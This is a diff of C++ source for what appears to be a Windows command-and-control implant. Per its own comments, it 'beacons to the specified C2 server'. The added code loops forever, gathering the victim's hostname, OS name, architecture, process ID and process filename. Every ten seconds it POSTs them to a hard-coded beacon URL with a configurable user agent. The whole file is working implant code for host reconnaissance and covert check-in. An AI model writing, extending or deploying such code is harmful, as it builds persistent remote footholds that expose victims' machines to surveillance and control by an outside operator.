@@ -1,161 +1,208 @@
+#include <cctype>		// URL encoding
+#include <iomanip>		// URL encoding
+#include <sstream>		// URL encoding
+#include <string>		// URL encoding
+#include "stdafx.h"		// WinHttpClient
+#include "WinHttpClient.h"	// WinHttpClient
+#include <Psapi.h>		// GetModuleBaseName()
 #include <iostream>
 #include <string>
-#include "stdafx.h" // WinHttpClient
-#include "WinHttpClient.h" // WinHttpClient
+#include <Windows.h>
+
+using namespace std;
+
+// Start of function prototypes
+wstring GetProcessFilename();
+wstring GetHostname();
+wstring Get32BitOS();
+wstring Get64BitOS();
+wstring GetArchitecture();
+string UTF8Encode(const wstring &PostData);
+string URLEncode(const string &Value);
+wstring Beacon(const wstring &BeaconURL, const wstring &UserAgent);
+// End of function prototypes
+
+#pragma comment(lib, "Psapi.lib") // GetModuleBaseName()
 
 
-
-// Function prototypes
-wstring beacon(wstring &beaconURL);
-wstring getHostname();
-wstring get32BitOS();
-wstring get64BitOS();
-wstring getArchitecture();
-string utf8Encode(const wstring &postData);
-string urlEncode(const string &unencoded);
-
-
-
-// Start of main() function
 int main()
 {
-	wstring beaconURL = L"https://192.168.1.142/beacon.php"; // **** Needs changed ****
-	beacon(beaconURL); // Beacons
+	wstring BeaconURL = L"http://192.168.1.100/beacon.php"; // **** Needs changed by user ****
+	wstring UserAgent = L"Test";				// **** Needs changed by user ****
+	int BeaconInterval = 10000;				// **** Needs changed by user ****
 
+	// Infinite loop
+	while (true)
+	{
+		Beacon(BeaconURL, UserAgent);
+		Sleep(BeaconInterval);
+	}
+	
 	return 0;
 }
 // End of main() function
 
 
-
-// Gets the system hostname - Working as of 06/06/16
-// Returns "hostname" wstring
-wstring getHostname()
+// Gets the current proccess' filename
+// Returns "ProcessFilename" wstring
+wstring GetProcessFilename()
 {
-	wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1] = L""; // wchar_t array initialization - MAX_COMPUTERNAME_LENGTH + 1 per MSDN
-	DWORD size;
-	GetComputerName(buffer, &size); // Gets the NetBIOS name of the local computer
+	HANDLE hProcess = GetCurrentProcess(); // Gets handle to current process
 
-	wstring hostname = buffer; // Creates new "hostname" wstring and sets value to the wchar_t array buffer above
-	return hostname; // Returns the "hostname" wstring to the calling function
+	wchar_t Filename[MAX_PATH]; // 260 characters
+	GetModuleBaseName(hProcess, NULL, Filename, MAX_PATH); // Returns just the process filename from the handle
+
+	wstring ProcessFilename = Filename; // Convert to wstring
+	return ProcessFilename;
 }
-// End of getHostname() function
+// End of GetProcessFileName() function
 
 
+// Gets the system hostname
+// Returns "Hostname" wstring
+wstring GetHostname()
+{
+	wchar_t Buffer[MAX_COMPUTERNAME_LENGTH + 1]; // MAX_COMPUTERNAME_LENGTH + 1 per MSDN
+	DWORD Size;
+	GetComputerName(Buffer, &Size); // Gets the NetBIOS name of the local computer
 
-// Gets the system OS for x86 systems - Working as of 06/07/16
-// Returns "os" wstring
-wstring get32BitOS()
+	wstring Hostname = Buffer; // Converts to wstring
+	return Hostname;
+}
+// End of GetHostname() function
+
+
+// Gets the system OS for x86 systems
+// Returns "OperatingSystem" wstring
+wstring Get32BitOS()
 {
 	HKEY hRegistry = NULL;
 	RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", &hRegistry); // Opens a handle to the Registry
 
-	DWORD size;
-	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, NULL, &size); // Queries the size (in bytes) for the "ProductName" Registry key - Will save size (in bytes) including null-terminator in "size" DWORD
+	DWORD Size;
+	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, NULL, &Size); // Queries the size (in bytes) for the "ProductName" Registry key - Will save size (in bytes) including null-terminator in "size" DWORD
 
-	wchar_t buffer[256] = L""; // EWWWW ...HARD-CODED ARRAY SIZE
-	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, (LPBYTE)&buffer, &size); // Queries the "ProductName" Registry key and stores output in buffer
-
-	wstring os = buffer; // Creates new "os" wstring and sets value to the wchar_t array buffer above
+	wchar_t Buffer[256];
+	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, (LPBYTE)&Buffer, &Size); // Queries the "ProductName" Registry key and stores output in buffer
 
 	RegCloseKey(hRegistry); // Closes the Registry handle
 
-	return os; // Returns the "os" wstring to the calling function
+	wstring OperatingSystem = Buffer; // Converts to wstring
+	return OperatingSystem;
 }
-// End of get32BitOS() function
+// End of Get32BitOS() function
 
 
-
-// Gets the system OS for x64 systems - Working as of 06/07/16
-// Returns "os" wstring
-wstring get64BitOS()
+// Gets the system OS for x64 systems
+// Returns "OperatingSystem" wstring
+wstring Get64BitOS()
 {
 	HKEY hRegistry = NULL;
 	RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion", &hRegistry); // Opens a handle to the Registry
-	
-	DWORD size;
-	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, NULL, &size); // Queries the size (in bytes) for the "ProductName" Registry key - Will save size (in bytes) including null-terminator in "size" DWORD
-	
-	wchar_t buffer[256] = L""; // EWWWW ...HARD-CODED ARRAY SIZE
-	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, (LPBYTE) &buffer, &size); // Queries the "ProductName" Registry key and stores output in buffer
 
-	wstring os = buffer; // Creates new "os" wstring and sets value to the wchar_t array buffer above
+	DWORD Size;
+	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, NULL, &Size); // Queries the size (in bytes) for the "ProductName" Registry key - Will save size (in bytes) including null-terminator in "size" DWORD
+
+	wchar_t Buffer[256];
+	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, (LPBYTE)&Buffer, &Size); // Queries the "ProductName" Registry key and stores output in buffer
 
 	RegCloseKey(hRegistry); // Closes the Registry handle
 
-	return os; // Returns the "os" wstring to the calling function
+	wstring OperatingSystem = Buffer; // Converts to wstring
+	return OperatingSystem;
 }
-// End of get64BitOS() function
+// End of Get64BitOS() function
 
 
-
-// Gets the system architecture - Working as of 06/06/16 - DOES NOT TAKE INTO ACCOUNT NON C: SYSTEM DRIVES (IE: OTHER DRIVE LETTERS)
-// Returns "architecture" wstring
-wstring getArchitecture()
+// Gets the system architecture - DOES NOT TAKE INTO ACCOUNT NON C: SYSTEM DRIVES (IE: OTHER DRIVE LETTERS)
+// Returns "Architecture" wstring
+wstring GetArchitecture()
 {
-	wstring architecture; // Creates "architecture" wstring
-	BOOL exists = PathFileExists(L"C:\\Windows\\SysWOW64"); // Determines if C:\Windows\SysWOW64 directory exists
+	wstring Architecture;
+	BOOL Exists = PathFileExists(L"C:\\Windows\\SysWOW64"); // Determines if C:\Windows\SysWOW64 directory exists
 
-	if (exists == TRUE) // If true, then the system architecture is x64
-		architecture = L"x64";
+	if (Exists == TRUE) // If true then the system architecture is x64
+		Architecture = L"x64";
 	else // Else the system architecture is x86
-		architecture = L"x86";
+		Architecture = L"x86";
 
-	return architecture; // Retruns the "architecture" wstring to the calling function
+	return Architecture;
 }
-// End of getArchitecture() function
-
+// End of GetArchitecture() function
 
 
 // Obtained from http://stackoverflow.com/questions/36774547/httpsendrequest-post-data-not-supporting-unicode
 // Used to convert POST data from UTF-16 (wstring) to UTF-8 (string)
-// Returns UTF-8 "out" string
-string utf8Encode(const wstring &postData)
+// Returns UTF-8 "Output" string
+string UTF8Encode(const wstring &PostData)
 {
-	string out;
-	int len = WideCharToMultiByte(CP_UTF8, 0, postData.c_str(), postData.length(), NULL, 0, NULL, NULL);
+	string Output;
+	int len = WideCharToMultiByte(CP_UTF8, 0, PostData.c_str(), PostData.length(), NULL, 0, NULL, NULL);
 	if (len > 0)
 	{
-		out.resize(len);
-		WideCharToMultiByte(CP_UTF8, 0, postData.c_str(), postData.length(), &out[0], len, NULL, NULL);
+		Output.resize(len);
+		WideCharToMultiByte(CP_UTF8, 0, PostData.c_str(), PostData.length(), &Output[0], len, NULL, NULL);
 	}
-	return out; // Returns UTF-8 string to the calling function
+	return Output; // Returns UTF-8 string to the calling function
 }
-// End of utf8Encode() function
+// End of UTF8Encode() function
 
+
+// Code obtained from http://stackoverflow.com/questions/154536/encode-decode-urls-in-c
+// Returns URL-encded string "Escaped"
+string URLEncode(const string &Value) {
+	ostringstream Escaped;
+	Escaped.fill('0');
+	Escaped << hex;
+
+	for (string::const_iterator i = Value.begin(), n = Value.end(); i != n; ++i)
+	{
+		string::value_type c = (*i);
+
+		// Keep alphanumeric and other accepted characters intact
+		if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
+			Escaped << c;
+			continue;
+		}
+
+		// Any other characters are percent-encoded
+		Escaped << uppercase;
+		Escaped << '%' << setw(2) << int((unsigned char)c);
+		Escaped << nouppercase;
+	}
+
+	return Escaped.str();
+}
+// End of URLEncode() function
 
 
 // Beacons to the specified C2 server
-// Returns "response" wstring
-wstring beacon(wstring &beaconURL)
+// Returns "Response" wstring
+wstring Beacon(const wstring &BeaconURL, const wstring &UserAgent)
 {
-	WinHttpClient beacon(beaconURL); // New WinHttpClient instance
+	WinHttpClient Beacon(BeaconURL);
+	Beacon.SetUserAgent(UserAgent);
+	Beacon.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER
 
-	beacon.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER
+	string PostData;
 
-	string data;
-
-	if (getArchitecture() == L"x86") // If system architecture is x86 so we need to call the 32-bit version of getOS()
-	{
-		data = "hostname=" + utf8Encode(getHostname()) + "&os=" + utf8Encode(get32BitOS()) + "&architecture=" + utf8Encode(getArchitecture()); // POST data
-	}
+	if (GetArchitecture() == L"x86") // If system architecture is x86 so we need to call the 32-bit version of getOS()
+		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get32BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&pid=" + to_string(GetCurrentProcessId()) + "&pfilename=" + URLEncode(UTF8Encode(GetProcessFilename())); // POST data
 	else // Else system architecture is x64 so we need to call the 64-bit version of getOS()
-	{
-		data = "hostname=" + utf8Encode(getHostname()) + "&os=" + utf8Encode(get64BitOS()) + "&architecture=" + utf8Encode(getArchitecture()); // POST data
-	}
-	
-	beacon.SetAdditionalDataToSend((BYTE *)data.c_str(), data.size());
-	wstring contentLength = to_wstring(data.length()); // We need to create new wstring for the Content-Length so we can append to the other headers
+		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get64BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&pid=" + to_string(GetCurrentProcessId()) + "&pfilename=" + URLEncode(UTF8Encode(GetProcessFilename())); // POST data
 
-	wstring headers = L"Content-Length: ";
-	headers += contentLength;
-	headers += L"\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
-	beacon.SetAdditionalRequestHeaders(headers); // Appends headers above
+	Beacon.SetAdditionalDataToSend((BYTE *)PostData.c_str(), PostData.size());
+	wstring ContentLength = to_wstring(PostData.length()); // We need to create new wstring for the "Content-Length" so we can append to the other headers
 
-	beacon.SendHttpRequest(L"POST"); // Sends the POST request
+	wstring Headers = L"Content-Length: ";
+	Headers += ContentLength;
+	Headers += L"\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
+	Beacon.SetAdditionalRequestHeaders(Headers); // Appends headers above
 
-	wstring response = beacon.GetResponseContent(); // Gets POST respone and stores in "response" wstring
+	Beacon.SendHttpRequest(L"POST"); // Sends the POST request
 
-	return response;
+	wstring Response = Beacon.GetResponseContent(); // Gets POST respone and stores in "response" wstring
+
+	return Response;
 }
-// End of beacon() function
+// End of Beacon() function
